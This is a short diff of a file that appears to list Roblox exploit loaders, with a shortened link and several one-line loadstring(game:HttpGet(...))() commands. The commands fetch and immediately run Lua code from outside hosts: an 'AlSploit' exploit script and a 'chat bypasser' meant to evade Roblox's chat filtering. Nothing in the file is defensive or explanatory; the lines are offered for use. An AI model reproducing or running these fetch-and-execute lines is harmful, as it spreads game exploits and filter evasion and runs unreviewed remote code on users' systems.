@@ -1,3 +1,3 @@
-Loadstring Guider: https://bit.ly/4qBUrrn/
+Loadstringer: https://bit.ly/4qBUrrn/
 AlSploit Script: loadstring(game:HttpGet("https://r2.packetroblox.xyz/alsploit.lua",true))()
-Best Chat Bypasser: loadstring(game:HttpGet("https://raw.githubusercontent.com/fearlessd3v/TEAM-FEARLESS/refs/heads/main/fearless-chat-bypass"))()
+Best Chat Bypasser: loadstring(game:HttpGet("https://raw.githubusercontent.com/fearlessd3v/TEAM-FEARLESS/refs/heads/main/fearless-chat-bypass",true))()
